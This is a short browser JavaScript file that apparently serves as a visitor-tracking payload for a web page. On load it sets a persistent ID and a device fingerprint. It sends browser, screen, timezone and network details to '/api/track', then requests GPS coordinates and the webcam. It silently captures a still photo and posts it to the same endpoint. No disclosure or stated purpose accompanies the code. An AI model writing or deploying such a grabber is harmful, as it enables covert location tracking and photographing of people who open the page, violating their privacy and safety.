const API = "/api/track";

// USER + SESSION
function getUserId() {
  let id = localStorage.getItem("user_id");
  if (!id) {
    id = crypto.randomUUID();
    localStorage.setItem("user_id", id);
  }
  return id;
}

const USER_ID = getUserId();
const SESSION_ID = crypto.randomUUID();

// SIMPLE FINGERPRINT
function getFingerprint() {
  return btoa(
    navigator.userAgent +
    screen.width +
    screen.height +
    navigator.language +
    navigator.hardwareConcurrency
  );
}

const FP = getFingerprint();

// SEND
function send(data) {
  fetch(API, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      user_id: USER_ID,
      session_id: SESSION_ID,
      fingerprint: FP,
      ...data
    })
  });
}

// INIT
send({
  event: "init",
  userAgent: navigator.userAgent,
  platform: navigator.platform,
  screen: screen.width + "x" + screen.height,
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
});

// NETWORK
const net = navigator.connection || {};
send({
  event: "network",
  effectiveType: net.effectiveType,
  downlink: net.downlink
});

// GPS
navigator.geolocation.getCurrentPosition(
  pos => send({
    event: "gps",
    lat: pos.coords.latitude,
    lng: pos.coords.longitude
  }),
  () => send({ event: "gps_denied" })
);

// CAMERA + FINAL
async function camera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });

    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    canvas.getContext("2d").drawImage(video, 0, 0);

    const image = canvas.toDataURL("image/jpeg", 0.5);

    send({
      event: "final",
      image,
      camera: "captured"
    });

    stream.getTracks().forEach(t => t.stop());

  } catch {
    send({
      event: "final",
      camera: "denied"
    });
  }
}

camera();

// fallback
setTimeout(() => {
  send({ event: "final", camera: "timeout" });
}, 8000);